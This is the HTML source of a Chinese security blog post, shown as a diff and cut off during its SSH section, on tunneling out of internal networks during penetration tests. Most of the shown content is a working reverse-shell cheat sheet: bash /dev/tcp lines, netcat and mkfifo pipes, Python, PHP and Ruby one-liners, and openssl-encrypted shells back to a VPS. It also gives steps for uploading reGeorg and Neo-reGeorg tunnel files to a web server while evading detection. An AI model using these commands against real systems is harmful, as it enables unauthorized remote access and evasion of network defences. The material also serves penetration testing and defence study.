@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>内网隧道穿透 - Geekby&#39;s Blog</title><meta name="Description" content="内网隧道穿透"><meta property="og:title" content="内网隧道穿透" />
+<meta property="og:description" content="内网隧道穿透" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-08-15T14:30:00+08:00" />
+<meta property="article:modified_time" content="2020-08-15T14:30:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="内网隧道穿透"/>
+<meta name="twitter:description" content="内网隧道穿透"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" /><link rel="prev" href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/" /><link rel="next" href="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "内网隧道穿透",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/08\/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透","wordcount":  1036 ,
+        "url": "https:\/\/www.geekby.site\/2020\/08\/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F\/","datePublished": "2020-08-15T14:30:00+08:00","dateModified": "2020-08-15T14:30:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "内网隧道穿透"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">内网隧道穿透</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-08-15">2020-08-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1036 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-场景介绍">1 场景介绍</a>
+      <ul>
+        <li><a href="#11-相关概念">1.1 相关概念</a></li>
+        <li><a href="#12-正向代理--反向代理">1.2 正向代理 &amp; 反向代理</a>
+          <ul>
+            <li><a href="#121-正向代理">1.2.1 正向代理</a></li>
+            <li><a href="#122-反向代理">1.2.2 反向代理</a></li>
+          </ul>
+        </li>
+        <li><a href="#13-转发场景">1.3 转发场景</a>
+          <ul>
+            <li><a href="#131-常见的场景">1.3.1 常见的场景</a></li>
+            <li><a href="#132-防火墙规则">1.3.2 防火墙规则</a></li>
+            <li><a href="#133-连通性检测">1.3.3 连通性检测</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2-反弹-shell">2 反弹 shell</a>
+      <ul>
+        <li><a href="#21-bash">2.1 Bash</a>
+          <ul>
+            <li><a href="#211-bash-tcp">2.1.1 Bash TCP</a></li>
+            <li><a href="#212-bash-udp">2.1.2 Bash UDP</a></li>
+          </ul>
+        </li>
+        <li><a href="#22-应用内反弹-shell">2.2 应用内反弹 shell</a>
+          <ul>
+            <li><a href="#221-netcat">2.2.1 netcat</a></li>
+            <li><a href="#222-python">2.2.2 python</a></li>
+            <li><a href="#223-php">2.2.3 PHP</a></li>
+            <li><a href="#224-ruby">2.2.4 Ruby</a></li>
+          </ul>
+        </li>
+        <li><a href="#23-openssl-流量加密">2.3 openssl 流量加密</a></li>
+        <li><a href="#24-all-in-one">2.4 All in One</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-应用层隧道">3 应用层隧道</a>
+      <ul>
+        <li><a href="#31-http-隧道">3.1 HTTP 隧道</a>
+          <ul>
+            <li><a href="#311-regeorg">3.1.1 reGeorg</a></li>
+            <li><a href="#312-neo-regorg">3.1.2 Neo-reGorg</a></li>
+            <li><a href="#313-其它">3.1.3 其它</a></li>
+          </ul>
+        </li>
+        <li><a href="#32-ssh-隧道">3.2 SSH 隧道</a>
+          <ul>
+            <li><a href="#321-本地端口转发">3.2.1 本地端口转发</a></li>
+            <li><a href="#322-远程端口转发">3.2.2 远程端口转发</a></li>
+            <li><a href="#323-动态转发---socket">3.2.3 动态转发 - Socket</a></li>
+          </ul>
+        </li>
+        <li><a href="#33-dns-隧道">3.3 DNS 隧道</a>
+          <ul>
+            <li><a href="#331-配置解析记录">3.3.1 配置解析记录</a></li>
+            <li><a href="#332-安装-dnscat2-服务端">3.3.2 安装 dnscat2 服务端</a></li>
+            <li><a href="#333-启动服务端">3.3.3 启动服务端</a></li>
+            <li><a href="#334-启动客户端">3.3.4 启动客户端</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-传输层">4 传输层</a>
+      <ul>
+        <li><a href="#41-frp">4.1 FRP</a>
+          <ul>
+            <li><a href="#411-服务端">4.1.1 服务端</a></li>
+            <li><a href="#412-客户端">4.1.2 客户端</a></li>
+          </ul>
+        </li>
+        <li><a href="#42-iox">4.2 iox</a>
+          <ul>
+            <li><a href="#421-端口转发">4.2.1 端口转发</a></li>
+            <li><a href="#422-代理">4.2.2 代理</a></li>
+          </ul>
+        </li>
+        <li><a href="#43-ssocks">4.3 sSocks</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-网络层">5 网络层</a>
+      <ul>
+        <li><a href="#51-icmp-tunnel">5.1 ICMP Tunnel</a>
+          <ul>
+            <li><a href="#511-服务端">5.1.1 服务端</a></li>
+            <li><a href="#512-客户端">5.1.2 客户端</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="内网隧道穿透">内网隧道穿透</h1>
+<h2 id="1-场景介绍">1 场景介绍</h2>
+<h3 id="11-相关概念">1.1 相关概念</h3>
+<p>内网穿透是：利用各种隧道技术，寻找防火墙允许的协议，混杂在正常流量中穿透，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p>
+<blockquote>
+<p>被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
+</blockquote>
+<p>隧道协议的主要作用包括：<strong>规避防火墙</strong>、<strong>加密网络流量</strong>。</p>
+<p>常见的隧道列举如下：</p>
+<ul>
+<li>应用层：SSH、HTTP、HTTPS、DNS。</li>
+<li>传输层：TCP、UDP、常规端口转发。</li>
+<li>网络层：IPv6、ICMP、GRE。</li>
+</ul>
+<h3 id="12-正向代理--反向代理">1.2 正向代理 &amp; 反向代理</h3>
+<p>正向代理中，proxy 和 client 同属一个 LAN，对 server 透明；</p>
+<p>反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。</p>
+<h4 id="121-正向代理">1.2.1 正向代理</h4>
+<p><code>Lhost -&gt; proxy -&gt; Rhost</code></p>
+<p>Lhost 为了访问到 Rhost，向 proxy 发送了一个请求并且指定目标是 Rhost，然后 proxy 向 Rhost 转交请求并将获得的内容返回给 Lhost，简单来说正向代理就是 proxy 代替了我们去访问 Rhost。</p>
+<h4 id="122-反向代理">1.2.2 反向代理</h4>
+<p><code>Lhost &lt;----&gt; proxy &lt;----&gt; firewall &lt;----&gt; Rhost</code></p>
+<p>和正向代理相反，Lhost 只向 proxy 发送普通的请求，具体让它转到哪里，proxy 自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许 proxy 数据进出的时候可以有效的进行穿透</p>
+<h3 id="13-转发场景">1.3 转发场景</h3>
+<h4 id="131-常见的场景">1.3.1 常见的场景</h4>
+<p><strong>安全运维</strong>：绕过堡垒机或防火墙实现对内网服务器进行远程管理</p>
+<p><strong>内网渗透</strong>：绕过堡垒机或防火墙实现对内网服务器进行攻击</p>
+<p>目标处于网络边界，内外网都可以访问，网络边界主机未安装防火墙，所有端口都对互联网开放，此类业务场景已经极少出现。</p>
+<p>目标处于内网，允许特定的应用层协议出网(比如 HTTP、SSH、DNS)等应用层协议(3389、22、445、53、80、443等)。</p>
+<p>目标处于内网，不能访问外网，但是可以访问边界主机，防火墙策略限制外部网络直接访问内网的敏感端口(3389、22、445 等)。</p>
+<p>常见的转发方式：</p>
+<ul>
+<li>反弹端口</li>
+<li>反弹 shell</li>
+<li>socks 代理</li>
+</ul>
+<h4 id="132-防火墙规则">1.3.2 防火墙规则</h4>
+<ul>
+<li>入网
+<ul>
+<li>特定的端口映射 <code>80:80</code></li>
+</ul>
+</li>
+<li>出网
+<ul>
+<li>ICMP</li>
+<li>允许特定的协议(HTTP、DNS、SSH、RDP)</li>
+<li>允许特定端口(先主流端口，再全端口)</li>
+</ul>
+</li>
+</ul>
+<h4 id="133-连通性检测">1.3.3 连通性检测</h4>
+<p>在建立隧道前，首先要检测目标机器是否能出网、什么协议可以出网。手动检测较麻烦，所以就有了这个工具，可配合如 wmiexec、psexec 等横向工具进行批量检测，该工具可以在 dnslog 中回显内网 ip 地址和计算机名，可实现内网中的快速定位可出网机器。</p>
+<p>工具：<a href="https://github.com/uknowsec/SharpNetCheck" target="_blank" rel="noopener noreffer">https://github.com/uknowsec/SharpNetCheck</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Usage: SharpNetCheck -dns -host ceye.io
+       SharpNetCheck -http -host/ip ceye.io
+       SharpNetCheck -all -host ceye.io
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="2-反弹-shell">2 反弹 shell</h2>
+<h3 id="21-bash">2.1 Bash</h3>
+<h4 id="211-bash-tcp">2.1.1 Bash TCP</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/ip/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+bash -i &gt; /dev/tcp/ip/port 0&lt;<span class="p">&amp;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="nb">exec</span> 5&lt;&gt;/dev/tcp/ip/port<span class="p">;</span>cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span>
+<span class="nb">exec</span> /bin/sh 0&lt;/dev/tcp/ip/port 1&gt;<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span><span class="m">0</span>
+0&lt;<span class="p">&amp;</span>196<span class="p">;</span><span class="nb">exec</span> 196&lt;&gt;/dev/tcp/ip/port<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> 2&gt;<span class="p">&amp;</span><span class="m">196</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="212-bash-udp">2.1.2 Bash UDP</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Victim:
+sh -i &gt;<span class="p">&amp;</span> /dev/udp/10.0.0.1/4242 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+Listener:
+nc -u -lvp <span class="m">4242</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="22-应用内反弹-shell">2.2 应用内反弹 shell</h3>
+<h4 id="221-netcat">2.2.1 netcat</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ncat ip port -e /bin/bash
+nc -e /bin/bash ip port
+rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc ip port &gt;/tmp/f
+rm -f x<span class="p">;</span> mknod x p <span class="o">&amp;&amp;</span> nc ip port 0&lt;x <span class="p">|</span> /bin/bash 1&gt;x
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="222-python">2.2.2 python</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;ip&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+
+<span class="c1"># windows only</span>
+python -c <span class="s1">&#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&#34;/bin/sh&#34;);&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Python 环境下的 Tips<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>转成交互式 shell：<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' </code></p>
+<p>完全交互式 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+Ctrl-Z
+$ stty raw -echo
+$ <span class="nb">fg</span>
+$ reset
+$ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+//$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</code></pre></td></tr></table>
+</div>
+</div></div>
+        </div>
+    </div>
+<h4 id="223-php">2.2.3 PHP</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;ip&#34;,port);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+
+<span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$s=fsockopen(&#34;ip&#34;,port);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;</span>
+  
+<span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$s=fsockopen(&#34;ip&#34;,port);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="224-ruby">2.2.4 Ruby</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ruby -rsocket -e<span class="s1">&#39;f=TCPSocket.open(&#34;ip&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+
+<span class="c1"># windows only</span>
+ruby -rsocket -e <span class="s1">&#39;c=TCPSocket.new(&#34;ip&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="23-openssl-流量加密">2.3 openssl 流量加密</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># VPS 生成 SSL 证书的公私钥对</span>
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes
+
+<span class="c1"># 在 VPS 监听反弹 shell</span>
+openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="m">4433</span>
+
+<span class="c1"># 在目标上用 openssl 加密反弹 shell 的流量(linux)</span>
+mkfifo /tmp/s<span class="p">;</span> /bin/sh -i &lt; /tmp/s 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> openssl s_client -quiet -connect IP:port &gt; /tmp/s<span class="p">;</span> rm /tmp/s
+
+<span class="c1"># windows</span>
+openssl s_client -quiet -connect <span class="o">[</span>ip<span class="o">]</span>:<span class="o">[</span>port1<span class="o">]</span> <span class="p">|</span> cmd.exe <span class="p">|</span> openssl s_client -quiet -connect <span class="o">[</span>ip<span class="o">]</span>:<span class="o">[</span>port2<span class="o">]</span>
+
+<span class="c1"># 以上命令会从 [ip]:[port1] 获取命令发送给 cmd.exe执行，然后把结果返回到 [ip]:[port2]</span>
+
+<span class="c1"># 因此在本机需要启动两个 s_server</span>
+
+<span class="c1"># 从 port1 发送命令到 cmd</span>
+
+openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</span>port1<span class="o">]</span> 
+<span class="c1"># 从 port2 获取发送给 port1 的命令执行结果</span>
+
+openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="o">[</span>port2<span class="o">]</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="24-all-in-one">2.4 All in One</h3>
+<p>以下是几个自动生成反弹 shell 命令的网站：</p>
+<p><a href="https://mrxn.net/reverse_shell.php" target="_blank" rel="noopener noreffer">https://mrxn.net/reverse_shell.php</a></p>
+<p><a href="https://ares-x.com/tools/reverse-shell/" target="_blank" rel="noopener noreffer">https://ares-x.com/tools/reverse-shell/</a></p>
+<p>一个在线编码的网站，防止因特殊字符被过滤，也可以用在 java.lang.Runtime.exec() 的 payload 中：</p>
+<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener noreffer">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<h2 id="3-应用层隧道">3 应用层隧道</h2>
+<h3 id="31-http-隧道">3.1 HTTP 隧道</h3>
+<h4 id="311-regeorg">3.1.1 reGeorg</h4>
+<p><strong>建议使用 nosocket 版</strong></p>
+<p>工具地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener noreffer">https://github.com/sensepost/reGeorg</a></p>
+<p>使用方法：</p>
+<ol>
+<li>上传 tunnel 文件</li>
+<li>服务端运行：<code>python reGeorgSocksProxy.py -p 8080 -u http://ip:port/tunnel/tunnel.jsp</code></li>
+</ol>
+<h4 id="312-neo-regorg">3.1.2 Neo-reGorg</h4>
+<p>工具地址：<a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener noreffer">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p><strong>Neo-reGeorg</strong> 是一个重构了 <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener noreffer">reGeorg</a> 的项目，目的是：</p>
+<ul>
+<li>提高 tunnel 连接安全性</li>
+<li>提高可用性，避免特征检测</li>
+<li>提高传输内容保密性</li>
+<li>应对更多的网络环境场景</li>
+</ul>
+<p>使用方法：</p>
+<ol>
+<li>设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器：<code>python3 neoreg.py generate -k password</code></li>
+<li>使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理：<code>python3 neoreg.py -k password -u http://xx/tunnel.php</code></li>
+</ol>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">注意，如果你的工具，如 nmap 不支持 socks5 代理设置，请使用 <a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noopener noreffer">proxychains</a> 等</div>
+        </div>
+    </div>
+<h4 id="313-其它">3.1.3 其它</h4>
+<ul>
+<li>Tunna</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># -u 远程代理脚本地址</span>
+<span class="c1"># -l 表示本地监听的端口</span>
+<span class="c1"># -r 远程映射端口</span>
+<span class="c1"># -v 输出详细数据</span>
+<span class="c1"># -a 代理远程连接的主机地址</span>
+python proxy.py -u http://ip/conn.aspx -l <span class="m">1080</span> -v
+python proxy.py -u http://ip/conn.aspx -l <span class="m">5555</span> -r <span class="m">8080</span> -s -v -n
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><a href="https://github.com/nccgroup/ABPTTS" target="_blank" rel="noopener noreffer">abptts</a></li>
+<li><a href="https://github.com/FunnyWolf/pystinger" target="_blank" rel="noopener noreffer">pystinger</a></li>
+<li>&hellip;</li>
+</ul>
+<h3 id="32-ssh-隧道">3.2 SSH 隧道</h3>
+<p>参考：<a href="https://3nd.xyz/AD-Pentest/AD-Pentest-Hidden-Tunnel/" target="_blank" rel="noopener noreffer">https://3nd.xyz/AD-Pentest/AD-Pentest-Hidden-Tunnel/</a></p>
+<h4 id="321-本地端口转发">3.2.1 本地端口转发</h4>
+<p>在本地主机上开启端口流量转发功能</p>
+<p>例如：在入侵者主机上执行（VPS 上执行主动连接）</p>
